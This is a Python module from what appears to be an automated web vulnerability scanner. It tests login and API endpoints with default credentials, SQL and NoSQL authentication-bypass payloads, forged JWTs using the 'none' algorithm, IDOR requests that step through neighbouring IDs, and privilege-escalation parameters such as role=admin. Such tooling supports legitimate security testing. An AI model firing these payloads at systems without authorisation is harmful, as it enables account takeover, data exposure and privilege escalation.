"""
XLayer AI Auth Hunter - Detects authentication and authorization vulnerabilities

XLayer AI Compatible - Broken Authentication & Authorization Category:
- Authentication Bypass
- IDOR (Insecure Direct Object Reference)
- Broken Access Control
- Session Management Issues
- JWT Vulnerabilities
- Privilege Escalation
"""

import re
import time
import json
import base64
from typing import List, Optional, Dict, Any, Tuple
from loguru import logger

from xlayer_hunter.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_hunter.models.target import AttackSurface, Endpoint, EndpointType
from xlayer_hunter.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)
from xlayer_hunter.tools.payload_manager import PayloadCategory


class AuthHunter(BaseHunter):
    """
    Authentication/Authorization Hunter
    
    Comprehensive detection for:
    - Authentication bypass (SQL injection, logic flaws)
    - IDOR (Insecure Direct Object Reference)
    - Broken access control (horizontal/vertical)
    - Session management issues (fixation, hijacking)
    - JWT vulnerabilities (algorithm confusion, weak secrets)
    - Privilege escalation
    - Weak credential policies
    
    OWASP: A01:2021 - Broken Access Control
           A07:2021 - Identification and Authentication Failures
    CWE: CWE-287, CWE-639, CWE-284, CWE-384, CWE-347
    """
    
    name = "auth"
    vuln_types = [
        VulnType.AUTH_BYPASS,
        VulnType.IDOR,
        VulnType.BROKEN_ACCESS_CONTROL,
        VulnType.SESSION_FIXATION,
        VulnType.JWT_VULNERABILITY,
        VulnType.PRIVILEGE_ESCALATION,
        VulnType.WEAK_CREDENTIALS
    ]
    
    # Common weak credentials for testing
    WEAK_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("root", "root"),
        ("root", "toor"),
        ("test", "test"),
        ("user", "user"),
        ("guest", "guest"),
        ("administrator", "administrator"),
    ]
    
    # SQL injection payloads for auth bypass
    AUTH_BYPASS_SQLI = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "admin'--",
        "admin' #",
        "' OR ''='",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1--",
        "admin' OR '1'='1",
        "' UNION SELECT 1,1,1--",
    ]
    
    # NoSQL injection payloads
    AUTH_BYPASS_NOSQL = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
    ]
    
    # JWT algorithm confusion payloads
    JWT_ALGORITHMS = ["none", "None", "NONE", "nOnE"]
    
    # Privilege escalation parameters
    PRIV_ESC_PARAMS = [
        ("role", ["admin", "administrator", "root", "superuser"]),
        ("is_admin", ["true", "1", "yes"]),
        ("admin", ["true", "1", "yes"]),
        ("user_type", ["admin", "staff", "moderator"]),
        ("privilege", ["admin", "high", "elevated"]),
        ("access_level", ["admin", "10", "99"]),
        ("group", ["admin", "administrators"]),
    ]
    
    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        """Hunt for authentication and authorization vulnerabilities"""
        start_time = time.time()
        self._reset_state()
        
        logger.info(f"Auth Hunter starting - XLayer AI compatible")
        
        # Test authentication endpoints
        for endpoint in attack_surface.auth_endpoints:
            # Test weak credentials
            weak_cred_hypotheses = await self._test_weak_credentials(endpoint)
            self._hypotheses.extend(weak_cred_hypotheses)
            
            # Test auth bypass (SQLi, NoSQLi)
            auth_hypotheses = await self._test_auth_bypass(endpoint)
            self._hypotheses.extend(auth_hypotheses)
        
        # Test for IDOR on API endpoints
        for endpoint in attack_surface.api_endpoints:
            idor_hypotheses = await self._test_idor(endpoint)
            self._hypotheses.extend(idor_hypotheses)
        
        # Test for IDOR on all endpoints with ID parameters
        for endpoint in attack_surface.testable_endpoints:
            if self._has_id_parameter(endpoint):
                idor_hypotheses = await self._test_idor(endpoint)
                self._hypotheses.extend(idor_hypotheses)
        
        # Test for broken access control
        for endpoint in attack_surface.testable_endpoints:
            bac_hypotheses = await self._test_broken_access_control(endpoint)
            self._hypotheses.extend(bac_hypotheses)
        
        # Test for JWT vulnerabilities
        jwt_hypotheses = await self._test_jwt_vulnerabilities(attack_surface)
        self._hypotheses.extend(jwt_hypotheses)
        
        # Test for privilege escalation
        for endpoint in attack_surface.testable_endpoints:
            priv_hypotheses = await self._test_privilege_escalation(endpoint)
            self._hypotheses.extend(priv_hypotheses)
        
        duration = time.time() - start_time
        result = self._build_result(duration)
        
        logger.info(
            f"Auth Hunter complete: {result.findings_count} hypotheses, "
            f"{result.high_confidence_count} high confidence"
        )
        
        return result
    
    def _has_id_parameter(self, endpoint: Endpoint) -> bool:
        """Check if endpoint has ID-like parameters"""
        id_patterns = [
            "id", "user_id", "userid", "uid", "account", "profile",
            "order_id", "orderid", "customer_id", "doc_id", "file_id",
            "record", "item", "object", "resource"
        ]
        for param in endpoint.parameters:
            if any(p in param.name.lower() for p in id_patterns):
                return True
        return False
    
    async def _test_weak_credentials(self, endpoint: Endpoint) -> List[VulnHypothesis]:
        """Test for weak/default credentials"""
        hypotheses = []
        self._endpoints_tested += 1
        
        username_params = ["username", "user", "email", "login", "uname", "name"]
        password_params = ["password", "pass", "pwd", "passwd", "secret"]
        
        username_param = None
        password_param = None
        
        for param in endpoint.parameters:
            param_lower = param.name.lower()
            if any(u in param_lower for u in username_params):
                username_param = param.name
            if any(p in param_lower for p in password_params):
                password_param = param.name
        
        if not username_param or not password_param:
            return hypotheses
        
        for username, password in self.WEAK_CREDENTIALS[:5]:  # Test top 5
            self._payloads_sent += 1
            
            data = {username_param: username, password_param: password}
            
            try:
                response = await self.http.post(endpoint.url, data=data)
                
                if response.error:
                    continue
                
                if self._check_login_success(response):
                    indicators = [
                        VulnIndicator(
                            indicator_type="weak_credentials",
                            detail=f"Login successful with weak credentials: {username}:{password}",
                            confidence_boost=0.3
                        )
                    ]
                    
                    hypothesis = self._create_hypothesis(
                        vuln_type=VulnType.WEAK_CREDENTIALS,
                        endpoint=endpoint,
                        parameter=username_param,
                        confidence=Confidence.HIGH,
                        indicators=indicators,
                        suggested_payloads=[f"{username}:{password}"],
                        context={
                            "username": username,
                            "password": password,
                            "credential_type": "default"
                        }
                    )
                    hypotheses.append(hypothesis)
                    return hypotheses  # Stop on first success
                    
            except Exception as e:
                self._errors.append(f"Weak credential test failed: {e}")
        
        return hypotheses
    
    async def _test_auth_bypass(self, endpoint: Endpoint) -> List[VulnHypothesis]:
        """Test for authentication bypass vulnerabilities"""
        hypotheses = []
        self._endpoints_tested += 1
        
        bypass_payloads = self.payloads.get_auth_bypass_payloads()
        
        username_params = ["username", "user", "email", "login", "uname"]
        password_params = ["password", "pass", "pwd", "passwd"]
        
        username_param = None
        password_param = None
        
        for param in endpoint.parameters:
            param_lower = param.name.lower()
            if any(u in param_lower for u in username_params):
                username_param = param.name
            if any(p in param_lower for p in password_params):
                password_param = param.name
        
        if not username_param:
            return hypotheses
        
        # Test SQL injection bypass
        for payload in self.AUTH_BYPASS_SQLI:
            self._payloads_sent += 1
            
            data = {username_param: payload}
            if password_param:
                data[password_param] = "anything"
            
            try:
                response = await self.http.post(endpoint.url, data=data)
                
                if response.error:
                    continue
                
                bypass_indicators = self._check_auth_bypass_success(response)
                
                if bypass_indicators:
                    indicators = [
                        VulnIndicator(
                            indicator_type="auth_bypass",
                            detail=f"SQL injection bypass with: {payload[:30]}...",
                            confidence_boost=0.2
                        )
                    ]
                    indicators.extend(bypass_indicators)
                    
                    hypothesis = self._create_hypothesis(
                        vuln_type=VulnType.AUTH_BYPASS,
                        endpoint=endpoint,
                        parameter=username_param,
                        confidence=Confidence.MEDIUM,
                        indicators=indicators,
                        suggested_payloads=[payload],
                        context={
                            "bypass_type": "sqli",
                            "username_param": username_param,
                            "password_param": password_param
                        }
                    )
                    hypotheses.append(hypothesis)
                    
            except Exception as e:
                self._errors.append(f"Auth bypass test failed: {e}")
        
        # Test NoSQL injection bypass (for JSON endpoints)
        if endpoint.content_type and "json" in endpoint.content_type.lower():
            for payload in self.AUTH_BYPASS_NOSQL:
                self._payloads_sent += 1
                
                try:
                    json_data = {username_param: json.loads(payload)}
                    if password_param:
                        json_data[password_param] = json.loads(payload)
                    
                    response = await self.http.post(
                        endpoint.url,
                        json=json_data,
                        headers={"Content-Type": "application/json"}
                    )
                    
                    if response.error:
                        continue
                    
                    if self._check_login_success(response):
                        indicators = [
                            VulnIndicator(
                                indicator_type="nosql_bypass",
                                detail=f"NoSQL injection bypass successful",
                                confidence_boost=0.25
                            )
                        ]
                        
                        hypothesis = self._create_hypothesis(
                            vuln_type=VulnType.AUTH_BYPASS,
                            endpoint=endpoint,
                            parameter=username_param,
                            confidence=Confidence.HIGH,
                            indicators=indicators,
                            suggested_payloads=[payload],
                            context={
                                "bypass_type": "nosqli",
                                "injection_type": "mongodb"
                            }
                        )
                        hypotheses.append(hypothesis)
                        
                except Exception as e:
                    self._errors.append(f"NoSQL bypass test failed: {e}")
        
        return hypotheses
    
    def _check_login_success(self, response) -> bool:
        """Check if login was successful"""
        success_patterns = [
            r"welcome",
            r"dashboard",
            r"logged.?in",
            r"success",
            r"profile",
            r"account",
            r"logout",
            r"authenticated",
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response.body, re.IGNORECASE):
                return True
        
        if response.cookies:
            session_cookies = ["session", "token", "auth", "jwt", "sid", "PHPSESSID"]
            for cookie_name in response.cookies:
                if any(s in cookie_name.lower() for s in session_cookies):
                    return True
        
        if response.status in [302, 303] and response.redirects:
            for redirect in response.redirects:
                if any(p in redirect.lower() for p in ["dashboard", "home", "profile", "admin"]):
                    return True
        
        return False
    
    def _check_auth_bypass_success(self, response) -> List[VulnIndicator]:
        """Check if authentication bypass was successful"""
        indicators = []
        
        success_patterns = [
            r"welcome",
            r"dashboard",
            r"logged.?in",
            r"success",
            r"profile",
            r"account",
            r"logout",
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response.body, re.IGNORECASE):
                indicators.append(VulnIndicator(
                    indicator_type="success_indicator",
                    detail=f"Found success pattern: {pattern}",
                    confidence_boost=0.1
                ))
        
        if response.cookies:
            session_cookies = ["session", "token", "auth", "jwt", "sid"]
            for cookie_name in response.cookies:
                if any(s in cookie_name.lower() for s in session_cookies):
                    indicators.append(VulnIndicator(
                        indicator_type="session_cookie",
                        detail=f"Session cookie set: {cookie_name}",
                        confidence_boost=0.15
                    ))
        
        if response.status in [200, 302] and response.redirects:
            for redirect in response.redirects:
                if any(p in redirect.lower() for p in ["dashboard", "home", "profile"]):
                    indicators.append(VulnIndicator(
                        indicator_type="redirect",
                        detail=f"Redirected to: {redirect}",
                        confidence_boost=0.1
                    ))
        
        return indicators
    
    async def _test_idor(self, endpoint: Endpoint) -> List[VulnHypothesis]:
        """Test for Insecure Direct Object Reference"""
        hypotheses = []
        
        id_params = []
        for param in endpoint.parameters:
            param_lower = param.name.lower()
            if any(p in param_lower for p in [
                "id", "uid", "user", "account", "profile", "order",
                "doc", "file", "record", "item", "customer"
            ]):
                id_params.append(param)
        
        if not id_params:
            return hypotheses
        
        self._endpoints_tested += 1
        
        for param in id_params:
            original_value = param.sample_value or "1"
            
            try:
                original_id = int(original_value)
                test_ids = [
                    str(original_id + 1),
                    str(original_id - 1),
                    str(original_id + 100),
                    str(original_id + 1000),
                    "0",
                    "-1",
                ]
            except ValueError:
                test_ids = ["1", "2", "admin", "test", "0"]
            
            baseline_response = await self._send_payload(endpoint, param.name, original_value)
            if not baseline_response:
                continue
            
            baseline_length = len(baseline_response["body"])
            baseline_status = baseline_response["status"]
            
            for test_id in test_ids:
                self._payloads_sent += 1
                
                response = await self._send_payload(endpoint, param.name, test_id)
                
                if not response:
                    continue
                
                if response["status"] == 200:
                    response_length = len(response["body"])
                    
                    if response_length > 100 and abs(response_length - baseline_length) < baseline_length * 0.5:
                        different_content = self._check_different_data(
                            baseline_response["body"],
                            response["body"]
                        )
                        
                        if different_content:
                            indicators = [
                                VulnIndicator(
                                    indicator_type="idor_access",
                                    detail=f"Accessed different resource with ID: {test_id}",
                                    confidence_boost=0.2
                                ),
                                VulnIndicator(
                                    indicator_type="data_difference",
                                    detail="Response contains different user data",
                                    confidence_boost=0.15
                                )
                            ]
                            
                            hypothesis = self._create_hypothesis(
                                vuln_type=VulnType.IDOR,
                                endpoint=endpoint,
                                parameter=param.name,
                                confidence=Confidence.MEDIUM,
                                indicators=indicators,
                                suggested_payloads=test_ids,
                                context={
                                    "original_id": original_value,
                                    "test_id": test_id,
                                    "baseline_length": baseline_length,
                                    "response_length": response_length,
                                    "idor_type": "horizontal"
                                }
                            )
                            hypotheses.append(hypothesis)
                            break
        
        return hypotheses
    
    async def _test_broken_access_control(self, endpoint: Endpoint) -> List[VulnHypothesis]:
        """Test for broken access control"""
        hypotheses = []
        
        admin_patterns = [
            "/admin", "/administrator", "/manage", "/management",
            "/dashboard", "/panel", "/control", "/backend",
            "/api/admin", "/api/users", "/api/config"
        ]
        
        url_lower = endpoint.url.lower()
        if not any(p in url_lower for p in admin_patterns):
            return hypotheses
        
        self._endpoints_tested += 1
        
        # Test without authentication
        try:
            response = await self.http.get(endpoint.url)
            
            if response.status == 200 and len(response.body) > 100:
                admin_indicators = [
                    r"admin",
                    r"dashboard",
                    r"manage",
                    r"configuration",
                    r"settings",
                    r"users",
                ]
                
                for pattern in admin_indicators:
                    if re.search(pattern, response.body, re.IGNORECASE):
                        indicators = [
                            VulnIndicator(
                                indicator_type="unauth_admin_access",
                                detail=f"Admin content accessible without auth: {pattern}",
                                confidence_boost=0.2
                            )
                        ]
                        
                        hypothesis = self._create_hypothesis(
                            vuln_type=VulnType.BROKEN_ACCESS_CONTROL,
                            endpoint=endpoint,
                            parameter="url",
                            confidence=Confidence.MEDIUM,
                            indicators=indicators,
                            suggested_payloads=[endpoint.url],
                            context={
                                "access_type": "unauthenticated",
                                "admin_pattern": pattern
                            }
                        )
                        hypotheses.append(hypothesis)
                        break
                        
        except Exception as e:
            self._errors.append(f"BAC test failed: {e}")
        
        return hypotheses
    
    async def _test_jwt_vulnerabilities(self, attack_surface: AttackSurface) -> List[VulnHypothesis]:
        """Test for JWT vulnerabilities"""
        hypotheses = []
        
        # Look for JWT tokens in cookies or headers
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        
        for endpoint in attack_surface.testable_endpoints:
            # Check if endpoint uses JWT
            response = await self.http.get(endpoint.url)
            
            if not response or response.error:
                continue
            
            # Look for JWT in response
            jwt_match = re.search(jwt_pattern, response.body)
            if not jwt_match:
                continue
            
            jwt_token = jwt_match.group()
            
            # Test algorithm confusion (alg: none)
            try:
                parts = jwt_token.split('.')
                if len(parts) == 3:
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                    
                    for alg in self.JWT_ALGORITHMS:
                        header['alg'] = alg
                        new_header = base64.urlsafe_b64encode(
                            json.dumps(header).encode()
                        ).decode().rstrip('=')
                        
                        # Create token with no signature
                        modified_token = f"{new_header}.{parts[1]}."
                        
                        self._payloads_sent += 1
                        
                        # Test with modified token
                        test_response = await self.http.get(
                            endpoint.url,
                            headers={"Authorization": f"Bearer {modified_token}"}
                        )
                        
                        if test_response and test_response.status == 200:
                            indicators = [
                                VulnIndicator(
                                    indicator_type="jwt_alg_none",
                                    detail=f"JWT accepted with algorithm: {alg}",
                                    confidence_boost=0.3
                                )
                            ]
                            
                            hypothesis = self._create_hypothesis(
                                vuln_type=VulnType.JWT_VULNERABILITY,
                                endpoint=endpoint,
                                parameter="Authorization",
                                confidence=Confidence.HIGH,
                                indicators=indicators,
                                suggested_payloads=[modified_token],
                                context={
                                    "vulnerability": "algorithm_confusion",
                                    "original_alg": header.get('alg', 'unknown'),
                                    "bypass_alg": alg
                                }
                            )
                            hypotheses.append(hypothesis)
                            break
                            
            except Exception as e:
                self._errors.append(f"JWT test failed: {e}")
        
        return hypotheses
    
    async def _test_privilege_escalation(self, endpoint: Endpoint) -> List[VulnHypothesis]:
        """Test for privilege escalation vulnerabilities"""
        hypotheses = []
        
        for param_name, values in self.PRIV_ESC_PARAMS:
            # Check if endpoint has this parameter
            has_param = any(
                param_name in p.name.lower()
                for p in endpoint.parameters
            )
            
            if not has_param:
                continue
            
            self._endpoints_tested += 1
            
            for value in values:
                self._payloads_sent += 1
                
                response = await self._send_payload(endpoint, param_name, value)
                
                if not response:
                    continue
                
                if response["status"] == 200:
                    admin_patterns = [
                        r"admin",
                        r"administrator",
                        r"elevated",
                        r"privilege",
                        r"superuser",
                    ]
                    
                    for pattern in admin_patterns:
                        if re.search(pattern, response["body"], re.IGNORECASE):
                            indicators = [
                                VulnIndicator(
                                    indicator_type="priv_escalation",
                                    detail=f"Privilege escalation via {param_name}={value}",
                                    confidence_boost=0.2
                                )
                            ]
                            
                            hypothesis = self._create_hypothesis(
                                vuln_type=VulnType.PRIVILEGE_ESCALATION,
                                endpoint=endpoint,
                                parameter=param_name,
                                confidence=Confidence.MEDIUM,
                                indicators=indicators,
                                suggested_payloads=[value],
                                context={
                                    "escalation_param": param_name,
                                    "escalation_value": value,
                                    "matched_pattern": pattern
                                }
                            )
                            hypotheses.append(hypothesis)
                            break
        
        return hypotheses
    
    def _check_different_data(self, baseline: str, response: str) -> bool:
        """Check if response contains different data than baseline"""
        if baseline == response:
            return False
        
        data_patterns = [
            r'"id"\s*:\s*\d+',
            r'"user_?id"\s*:\s*\d+',
            r'"email"\s*:\s*"[^"]+"',
            r'"name"\s*:\s*"[^"]+"',
            r'"username"\s*:\s*"[^"]+"',
            r'"account"\s*:\s*"[^"]+"',
        ]
        
        for pattern in data_patterns:
            baseline_match = re.search(pattern, baseline)
            response_match = re.search(pattern, response)
            
            if baseline_match and response_match:
                if baseline_match.group() != response_match.group():
                    return True
        
        return len(response) > 100 and baseline != response
    
    def _analyze_response(
        self,
        endpoint: Endpoint,
        parameter: str,
        payload: str,
        response: Dict[str, Any]
    ) -> Optional[VulnHypothesis]:
        """Analyze response for auth vulnerabilities"""
        return None
